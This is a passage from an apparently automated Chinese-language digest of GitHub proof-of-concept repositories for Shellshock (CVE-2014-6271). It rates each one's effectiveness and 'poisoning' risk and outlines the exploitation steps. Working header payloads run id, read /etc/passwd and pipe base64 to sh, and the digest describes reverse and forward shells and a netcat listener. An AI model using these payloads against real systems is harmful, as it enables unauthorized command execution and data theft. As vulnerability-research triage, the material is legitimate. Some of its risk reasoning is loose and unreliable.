CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过特制的、包含恶意代码的环境变量，在目标系统上执行任意命令。漏洞利用的方式是：通过将包含函数定义的恶意字符串作为环境变量的值传递给Bash，Bash在解析这些环境变量时，会错误地执行函数定义后面的命令。漏洞利用代码分析：提供的Dockerfile构建了一个包含易受攻击的Bash版本（4.3.0）和Apache HTTP Server的Docker镜像。`safe.cgi`和`victim.cgi`脚本被添加到`/var/www/html/`目录下。`victim.cgi`使用易受攻击的Bash版本，而`safe.cgi` 使用修复后的版本（但提供的代码中，两个cgi都一样，都是直接输出helloworld）。攻击者可以通过修改User-Agent头，或者通过其他CGI变量传递恶意代码，从而在服务器上执行命令。根据readme.md的描述，向victim.cgi发送包含payload的User-Agent，可以触发漏洞。例如：

`User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id`

该漏洞利用的有效性较高，因为漏洞原理简单，且影响范围广泛。**投毒风险评估：**代码仓库中可能存在作者隐藏的恶意代码的风险较低，这里评估为1%。主要原因是：Dockerfile比较简单，只是构建了一个包含特定版本Bash和Apache HTTP Server的镜像，没有发现明显的后门代码。safe.cgi和victim.cgi 脚本本身也比较简单，只是输出“Hello world”，并没有包含任何可疑的逻辑。flagA文件只是一个标记文件，不包含任何可执行代码。虽然不能完全排除作者在镜像构建过程中隐藏恶意代码的可能性，但从目前的代码来看，这种可能性很小。

**利用方式总结：**

1.  **确定目标系统使用的Bash版本在受影响范围内（<=4.3）。**
2.  **找到一个可以设置环境变量的入口点，例如CGI脚本、OpenSSH的ForceCommand等。**
3.  **构造包含恶意代码的环境变量，例如：`() { :; }; /usr/bin/id`。**
4.  **将该环境变量传递给Bash。**
5.  **Bash解析环境变量时，会执行恶意代码。**

利用代码中的`victim.cgi`脚本是一个CGI入口点，攻击者可以通过修改HTTP请求头（例如User-Agent）来设置环境变量，从而触发漏洞。

**项目地址:** [cyberharsh/Shellbash-CVE-2014-6271](https://github.com/cyberharsh/Shellbash-CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #20

**来源**: [CVE-2014-6271-hadrian3689_shellshock.md](../2014/CVE-2014-6271-hadrian3689_shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** Bash <= 4.3

**利用条件:** 目标系统存在CGI脚本或通过OpenSSH等方式设置环境变量

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的远程代码执行漏洞。该漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。

**有效性：**
提供的POC代码是有效的。该Python脚本利用Shellshock漏洞通过User-Agent头注入恶意Bash代码，从而在目标系统上执行命令，可以实现反向shell或伪交互式shell。

**投毒风险：**
该脚本主要功能是利用Shellshock漏洞，但代码中存在一定的投毒风险：
*   **风险点：** `shellshock.py`中的payload构造部分，即`payload = "() { :;}; echo; /bin/bash -c 'echo " + cmd + " | base64 -d | sh'"`。虽然脚本本身的目标是实现反向shell，但是攻击者可以修改`cmd`变量的内容，插入恶意的、非反向shell的代码，进行破坏或植入后门。
*   **缓解措施：** 使用者应仔细审查脚本内容，尤其是`cmd`变量的赋值部分，确保脚本执行的是预期操作，并且来自可信来源。
*   **投毒风险百分比:** 10%。主要是脚本中自定义命令的灵活性可能被滥用，并非恶意代码。大部分代码功能清晰，实现的是漏洞利用逻辑。

**利用方式：**
1.  **漏洞原理：** Bash在解析环境变量时，如果环境变量的值包含函数定义，Bash会执行函数定义后面的字符串。攻击者可以利用这个特性，在环境变量中注入恶意代码。
2.  **攻击方法：**
    *   **通过HTTP User-Agent头：** POC脚本通过修改HTTP请求的User-Agent头，将包含恶意代码的环境变量传递给服务器。如果服务器使用Bash处理User-Agent头（例如，通过CGI脚本），那么恶意代码就会被执行。
    *   **反向Shell：** 脚本通过构造Bash命令，建立与攻击者机器的反向TCP连接，从而获得目标系统的shell访问权限。
    *   **正向Shell (防火墙绕过)：** 脚本创建一个命名管道(FIFO)用于输入和输出，攻击者通过HTTP请求向管道写入命令，并读取管道的输出来实现交互式shell。这种方式可以绕过一些防火墙的限制。
3.  **利用条件：**
    *   目标系统运行着存在Shellshock漏洞的Bash版本。
    *   存在可以传递环境变量给Bash的途径，例如CGI脚本、OpenSSH的ForceCommand等。
    *   如果使用反向shell，目标系统需要能够连接到攻击者的机器。

**项目地址:** [hadrian3689/shellshock](https://github.com/hadrian3689/shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #21

**来源**: [CVE-2014-6271-hanmin0512_CVE-2014-6271_pwnable.md](../2014/CVE-2014-6271-hanmin0512_CVE-2014-6271_pwnable.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** Bash

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在CGI脚本、OpenSSH等利用入口，允许设置环境变量

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的命令注入漏洞。攻击者可以构造包含恶意代码的环境变量，当Bash shell执行时，会将恶意代码一并执行，从而达到远程命令执行的目的。

**有效性：**

提供的POC代码是有效的，它演示了利用Shellshock漏洞的基本原理，即通过设置包含恶意代码的环境变量来执行任意命令。shellshock.c 文件通过提权后执行 bash 命令来证明改漏洞的利用。

**投毒风险：**

代码仓库中未发现明显的投毒代码。shellshock.c 只是简单的提权后执行了 bash 命令。

**利用方式：**

1.  **漏洞原理：** Bash在处理环境变量时，如果环境变量的值以函数定义开头，Bash会尝试解析并执行该函数定义之后的代码。如果攻击者能够控制环境变量的内容，就可以注入恶意的代码。

2.  **利用场景：**

    *   **CGI脚本：**  Web服务器在执行CGI脚本时，会将HTTP请求头中的某些字段作为环境变量传递给脚本。攻击者可以修改这些HTTP请求头，注入恶意代码。
    *   **OpenSSH：**  如果OpenSSH启用了`ForceCommand`功能，并且`ForceCommand`中使用了Bash shell，攻击者可以通过设置环境变量来执行命令。
    *   **DHCP客户端：**  某些DHCP客户端脚本会执行Bash shell，攻击者可以通过控制DHCP服务器，设置包含恶意代码的环境变量。

3.  **利用步骤：**

    a.  确定目标系统存在Bash shell，且版本小于等于4.3。
    b.  找到一个可以通过环境变量影响Bash执行的入口（例如CGI脚本）。
    c.  构造包含恶意代码的环境变量，例如：
        `export payload='() { ignored; }; /bin/cat /etc/passwd'`
    d.  将该环境变量传递给Bash shell执行。
    e.  如果漏洞存在，`/etc/passwd`文件的内容将被输出。

**项目地址:** [hanmin0512/CVE-2014-6271_pwnable](https://github.com/hanmin0512/CVE-2014-6271_pwnable)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #22

**来源**: [CVE-2014-6271-indiandragon_Shellshock-Vulnerability-Scan.md](../2014/CVE-2014-6271-indiandragon_Shellshock-Vulnerability-Scan.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，且攻击者能够通过环境变量影响Bash执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271（ShellShock）是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。漏洞利用方式主要依赖于Bash处理函数定义后尾随字符串的方式。攻击者可以将恶意代码嵌入到环境变量中，当Bash解析这些变量时，尾随的恶意代码会被执行。

**有效性评估：**
漏洞库信息和搜索结果均表明该漏洞真实存在且危害严重，存在大量可利用的场景。利用代码库中提供的文件看起来是GNU GPL许可证，本身不包含攻击代码，但实际漏洞利用需要构造特定的环境变量。

**投毒风险评估：**
提供的漏洞利用代码片段（LICENSE文件）本身不具备投毒性，它只是一个开源协议文件。投毒风险主要存在于漏洞利用的上下文和攻击者构造的恶意环境变量中。如果攻击者散布包含恶意代码的环境变量构造方法，可能会诱导用户执行有害操作。但仅分析提供的LICENSE文件，投毒风险极低，约为1%。

**利用方式分析：**
1.  **环境变量注入：** 攻击者构造包含恶意代码的环境变量，例如：`(){ :; }; /bin/eject`。
2.  **触发Bash解析：** 寻找能够触发Bash解析这些环境变量的入口点。常见的入口点包括：
    *   OpenSSH的`ForceCommand`。
    *   Apache HTTP Server的`mod_cgi`和`mod_cgid`模块。
    *   DHCP客户端脚本。
    *   其他任何跨越权限边界并设置环境变量的Bash执行场景。
3.  **远程代码执行：** 当Bash解析包含恶意代码的环境变量时，嵌入的命令会被执行，导致远程代码执行。

根据搜索结果，该漏洞已存在多年，但由于其影响范围广泛，仍然值得关注。应及时更新Bash版本，并检查系统配置，避免受到攻击。

**项目地址:** [indiandragon/Shellshock-Vulnerability-Scan](https://github.com/indiandragon/Shellshock-Vulnerability-Scan)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #23

**来源**: [CVE-2014-6271-knightc0de_Shellshock_vuln_Exploit.md](../2014/CVE-2014-6271-knightc0de_Shellshock_vuln_Exploit.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行，系统权限获取

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash作为shell，且存在CGI脚本或允许通过环境变量传递命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。当Bash shell处理这些环境变量时，会在函数定义后执行嵌入的命令，从而导致安全风险。

**有效性：**

提供的PoC代码是有效的，它通过`pwn`库和`requests`库实现漏洞利用。该脚本通过构造包含恶意Bash代码的HTTP请求头（User-Agent, Cookie, Referer）发送到目标服务器，如果目标服务器存在CGI脚本且使用存在漏洞的Bash版本，则会执行恶意代码，并反弹shell到攻击者指定的IP地址和端口。

**投毒风险：**

该仓库中存在一定的投毒风险，风险评估为10%。虽然作者提供了免责声明，并且主要代码逻辑是为了利用Shellshock漏洞，但仍然存在潜在的后门或恶意修改的可能性，尽管看起来相对较低：
*   **依赖风险**: 依赖`pwn`和`requests`库，如果这些库被篡改，可能引入恶意代码。
*   **Payload定制**: Payload的构造方式可能被修改，引入额外的恶意行为。

**利用方式：**

1.  **确定目标：** 寻找运行CGI脚本的web服务器，或者其他任何可能通过环境变量传递命令给Bash的应用程序。
2.  **构造Payload：** 构造一个包含恶意Bash代码的环境变量，例如：`() { :;}; /bin/bash -c 'command'`。
3.  **传递Payload：** 通过HTTP请求头（User-Agent, Cookie, Referer）或者其他方式将payload作为环境变量传递给目标系统。
4.  **触发漏洞：** 当Bash shell处理包含恶意代码的环境变量时，会执行嵌入的命令。
5.  **获取权限：** 利用反弹shell或其他方式获取目标系统的控制权。

**项目地址:** [knightc0de/Shellshock_vuln_Exploit](https://github.com/knightc0de/Shellshock_vuln_Exploit)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #24

**来源**: [CVE-2014-6271-mochizuki875_CVE-2014-6271-Apache-Debian.md](../2014/CVE-2014-6271-mochizuki875_CVE-2014-6271-Apache-Debian.md)

## CVE-2014-6271-Apache-Debian Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在CGI脚本，且Apache配置允许执行CGI脚本，并且Bash版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271（Shellshock）是一个影响 GNU Bash 的高危漏洞。该漏洞源于 Bash 处理环境变量中函数定义后附加字符串的方式存在缺陷，允许远程攻击者通过构造特殊的环境变量来执行任意代码。

**有效性：**

根据提供的 PoC 代码（/tmp/47c4ac3d27239b789878e6360b54dc21/README.md），该 PoC 旨在演示如何在 Apache Debian 环境中利用 CVE-2014-6271 漏洞。它包含构建易受攻击的 Docker 镜像和 Kubernetes 清单的步骤，以及利用漏洞的演示。

PoC 代码的有效性通过以下事实得到证实：

*   它提供了一个明确的攻击向量：通过 `User-Agent` HTTP 头传递恶意构造的 Bash 函数定义。
*   它演示了如何获得受害容器上的 shell 访问权限。
*   它演示了如何在受害容器上修改 Web 页面内容。

因此，提供的 PoC 代码可以被认为是有效的。

**投毒风险：**

评估 PoC 代码的投毒风险表明，主要风险较低，约为 5%。

*   **高风险文件:** 位于`/tmp/47c4ac3d27239b789878e6360b54dc21/web-insecure/Dockerfile`，这个Dockerfile 用于构建包含漏洞环境，该漏洞是已知的，构建目的是用于演示验证，所以它不是投毒代码。
*   **低风险文件:** 其他文件（例如 web-secure 目录中的文件和 k8s 清单文件）似乎是良性的，并且用于设置安全的环境以进行比较或者演示。
*   **总体分析:**

虽然该存储库的目的是演示漏洞，但攻击者可能会修改 `web-insecure/Dockerfile` 以包含其他恶意软件或后门。用户在使用这些文件构建镜像时应谨慎。

**利用方式：**

利用 CVE-2014-6271 漏洞涉及以下步骤：

1.  **确定目标：**识别运行易受攻击的 Bash 版本的系统，该系统通常用于处理 Web 请求或 CGI 脚本。
2.  **构造攻击负载：**创建一个包含恶意 Bash 函数定义的特殊构造的环境变量。
3.  **传递攻击负载：**通过 HTTP 请求头（例如 `User-Agent`）或 CGI 脚本可以访问的任何其他环境变量将攻击负载传递到目标系统。
4.  **执行任意代码：**当 Bash 处理恶意环境变量时，它会执行其中嵌入的命令。

在提供的 PoC 代码中，利用方式如下：

1.  攻击者设置一个 netcat 监听器 (`nc -nvlp 5050`)。
2.  攻击者使用 curl 命令向易受攻击的 Web 服务发送一个 HTTP 请求，其中 `User-Agent` 头包含一个恶意的 Bash 函数定义。这个函数定义包含执行反向 shell 的命令，将 shell 连接到攻击者的 netcat 监听器。
3.  当 Web 服务（通常通过 CGI 脚本）执行 Bash 时，Bash 会处理恶意的 `User-Agent` 头，执行反向 shell 命令，并允许攻击者访问受害容器上的 shell。

**项目地址:** [mochizuki875/CVE-2014-6271-Apache-Debian](https://github.com/mochizuki875/CVE-2014-6271-Apache-Debian)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #25

**来源**: [CVE-2014-6271-moften_CVE-2014-6271.md](../2014/CVE-2014-6271-moften_CVE-2014-6271.md)

## CVE-2014-6271 Shellshock漏洞扫描器

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许攻击者执行任意命令

**影响版本:** <= 4.3

**利用条件:** 目标系统运行存在漏洞的Bash版本，并且存在CGI脚本或其他方式通过环境变量调用Bash。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271 (Shellshock) 漏洞允许攻击者通过特制的 Bash 环境变量执行任意命令。漏洞存在于 Bash 处理函数定义后尾随字符串的方式中。 

**有效性：**
提供的PoC代码是一个Python脚本，用于扫描目标URL是否存在Shellshock漏洞。它通过发送包含恶意payload的User-Agent头部的HTTP请求到常见的CGI脚本路径，然后检查响应中是否包含特定的字符串（'VULNERABLE-SHELLSHOCK'）来判断目标是否易受攻击。根据漏洞库信息和搜索结果，该漏洞利用方式是有效的。

**投毒风险：**
该仓库包含一个Python脚本和一个README.md文件。Python脚本的功能是发送包含特定payload的HTTP请求并检查响应。README.md文件仅包含项目名称和描述。
 *  投毒代码分析: 该python脚本主要功能是发送特定Header的请求到服务器端CGI脚本,存在以下潜在的投毒风险：
    *  **CGI脚本路径猜测：**脚本中包含一个常见的CGI脚本路径列表。如果攻击者控制了该列表，可以通过添加恶意CGI路径来欺骗扫描者，引导他们攻击不存在的或伪造的服务。
    *  **Payload修改：**虽然当前的payload是良性的，用于检测漏洞，但攻击者可能修改payload以执行恶意操作，例如上传后门或执行拒绝服务攻击。
    *  **扫描行为：** 扫描行为本身可能被目标系统检测为恶意活动，从而触发防御机制或记录扫描者的IP地址。
    *  **误报风险：**脚本依赖于特定的字符串（'VULNERABLE-SHELLSHOCK'）来判断漏洞是否存在。如果目标服务器返回包含该字符串的响应，即使实际不存在漏洞，脚本也会报告为易受攻击。修改这个字串可以导致信息泄露或者权限提升,因此可能存在一定风险。

**利用方式：**
1.  **环境变量注入：** 攻击者构造一个包含恶意代码的 Bash 函数定义的环境变量。例如：`(){ :;}; /usr/bin/id`。
2.  **触发 Bash 执行：** 通过 CGI 脚本、OpenSSH 的 ForceCommand 功能、DHCP 客户端脚本等方式，将构造的包含恶意代码的环境变量传递给 Bash。
3.  **代码执行：** 当 Bash 执行上述环境变量时，由于漏洞，尾随在函数定义后的命令会被执行，从而实现远程代码执行。

**总结：**
该PoC代码利用了Shellshock漏洞，通过环境变量注入执行任意命令。漏洞影响范围广泛，修复难度较大，危害程度高。


**项目地址:** [moften/CVE-2014-6271](https://github.com/moften/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #26

**来源**: [CVE-2014-6271-mritunjay-k_CVE-2014-6271.md](../2014/CVE-2014-6271-mritunjay-k_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过环境变量影响Bash执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，又名ShellShock，是GNU Bash中的一个严重漏洞。攻击者可以通过构造包含恶意代码的环境变量，当这些环境变量被传递给Bash执行的进程时，会导致远程代码执行。 

**有效性：** 提供的POC代码是有效的。它通过设置`User-Agent`头来传递恶意payload。如果目标URL指向一个CGI脚本，且该脚本使用Bash处理环境变量，那么攻击者就可以执行任意命令。POC代码还包含一个检查机制，如果URL不包含`/cgi-bin/status`，它会提示用户是否要添加该路径，这增加了攻击的灵活性。

**投毒风险：** 在提供的`exploit.py`和`README.md`文件中，没有发现任何明显的投毒代码。代码逻辑清晰，目标是利用ShellShock漏洞执行命令。没有发现作者尝试引入恶意行为，例如上传恶意文件、植入后门或窃取凭据。因此，投毒风险评估为0%。

**利用方式：** 

1.  **确定目标：** 找到运行存在漏洞的Bash版本的系统，该系统需要具有某种暴露点，该暴露点允许通过环境变量注入的方式利用Bash。常见的暴露点包括CGI脚本、OpenSSH的`ForceCommand`特性以及某些DHCP客户端。
2.  **构造Payload：** 构造一个包含恶意代码的环境变量。Payload的形式通常为`() { :; }; <command>`。其中`<command>`是要执行的shell命令。
3.  **传递Payload：** 将构造的Payload作为环境变量传递给Bash。对于CGI脚本，这可以通过设置HTTP头的`User-Agent`字段来实现，如提供的POC代码所示。在其他场景中，可能需要使用其他方法来设置环境变量。
4.  **执行命令：** 当Bash执行接收到包含Payload的CGI脚本时，它会解析环境变量，触发漏洞，并执行注入的命令。
5.  **验证执行结果:** POC脚本会打印出`page`的内容,命令执行的结果将会嵌入到返回的内容中.

**综上所述：** 提供的POC代码利用了ShellShock漏洞，通过构造恶意环境变量并在目标系统上触发执行，实现了远程命令执行。虽然漏洞利用风险很高，但提供的代码本身没有发现投毒风险。

**项目地址:** [mritunjay-k/CVE-2014-6271](https://github.com/mritunjay-k/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #27

**来源**: [CVE-2014-6271-opsxcq_exploit-CVE-2014-6271.md](../2014/CVE-2014-6271-opsxcq_exploit-CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，并且攻击者能够控制环境变量。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的严重漏洞。该漏洞源于Bash处理环境变量中函数定义之后存在的字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，当这些环境变量被Bash解析时，就能执行任意命令。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2014-6271是一个经过验证的漏洞，具有较高的利用成功率。

提供的Dockerfile和相关文件构成了一个可以利用该漏洞的环境。Dockerfile设置了一个基于Debian Wheezy的Apache服务器，并部署了一个CGI脚本（vulnerable），该脚本会调用Bash。攻击者可以通过设置恶意的环境变量，然后向CGI脚本发送HTTP请求来触发漏洞，从而在服务器上执行任意命令。

**投毒风险：**

分析提供的文件，存在一定的投毒风险，约为10%。Dockerfile中从/packages安装了预先存在的软件包。虽然COPY指令本身没有明显的恶意代码，但有需要审核的地方：
1. Dockerfile 从 `/packages` 目录安装软件包，而软件包的具体内容没有给出。如果这些包由攻击者控制，可能包含恶意后门。
2. `vulnerable` CGI 脚本的内容需要仔细审查，如果脚本本身存在后门，则存在投毒风险
3. main.sh 的内容也需要确认, 是否有安装一些额外的包.

**利用方式：**

1.  **CGI脚本利用：**  最常见的利用方式是通过CGI脚本。攻击者向Web服务器发送包含恶意环境变量的HTTP请求。如果Web服务器配置为使用Bash执行CGI脚本，Bash将解析这些环境变量，导致恶意代码执行。
2.  **OpenSSH ForceCommand：**  如果OpenSSH配置了ForceCommand选项，攻击者可以通过修改环境变量来执行任意命令。
3.  **DHCP客户端：**  某些DHCP客户端在执行脚本时会设置环境变量，攻击者可以通过控制DHCP服务器来注入恶意环境变量。

总之，CVE-2014-6271是一个高危漏洞，利用简单，影响广泛。需要及时修补受影响的系统。


**项目地址:** [opsxcq/exploit-CVE-2014-6271](https://github.com/opsxcq/exploit-CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #28

**来源**: [CVE-2014-6271-rsherstnev_CVE-2014-6271.md](../2014/CVE-2014-6271-rsherstnev_CVE-2014-6271.md)

## CVE-2014-6271 - ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程命令执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统运行Bash且存在可利用的入口点，例如CGI脚本、OpenSSH ForceCommand等。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271，也被称为ShellShock，是一个存在于GNU Bash中的远程命令执行漏洞。该漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。漏洞利用的核心在于Bash在处理函数定义后附加的字符串时存在缺陷。 

**有效性评估：**
提供的Python POC代码利用了ShellShock漏洞，其有效性较高。代码首先通过发送包含特定字符串（`HelloKittyFromN0rdeN!`）的请求头来检测目标系统是否存在漏洞。如果检测到漏洞，则进入交互式shell，允许攻击者执行任意命令。

**利用方式分析：**
1.  **漏洞检测：** POC首先发送一个HTTP请求，其中User-Agent、Referer和Cookie头都包含恶意的Bash代码。这段代码的目的是在受影响的Bash版本中执行`echo HelloKittyFromN0rdeN!`命令，从而验证漏洞是否存在。
2.  **命令执行：** 如果漏洞存在，POC会进入一个循环，允许攻击者输入命令。输入的命令会被Base64编码，然后插入到HTTP请求头中。服务器端的Bash会解码并执行这些命令。
3.  **向量：** 此POC利用HTTP请求头（User-Agent, Referer, Cookie）作为攻击向量，这些头通常会被传递给服务器并可能被Bash处理。

**投毒风险分析：**
POC代码主要功能是检测和利用ShellShock漏洞。分析代码后，发现潜在的投毒风险较低（约1%）。

*   **Base64编码：** 使用Base64编码命令可能会被认为是一种混淆手段，但这是为了确保命令在HTTP头中传输的安全性，并非恶意隐藏代码。
*   **第三方库：** POC使用了requests库，理论上存在requests库被篡改的风险。但是，requests是常用的Python库，被篡改的可能性极低。
*   **BASE64_PATH变量:** 该变量用于指定`base64`命令的路径,如果该路径被修改为恶意程序,会存在投毒风险,但原代码中该变量默认为`/usr/bin/base64`,属于正常路径. 
*   **风险点：** 主要风险集中在使用未经授权的服务器上执行任意命令，这本身就是漏洞利用的目的，而不是POC代码引入的额外风险。

**搜索引擎结果印证：**
搜索结果确认了CVE-2014-6271是ShellShock漏洞，并且是广泛存在的，有多种利用方式。这些结果也强调了该漏洞的严重性和潜在影响。

综上所述，该POC代码的有效性较高，投毒风险较低，主要用于检测和利用ShellShock漏洞，允许攻击者通过HTTP请求头在目标系统上执行任意命令。

**项目地址:** [rsherstnev/CVE-2014-6271](https://github.com/rsherstnev/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

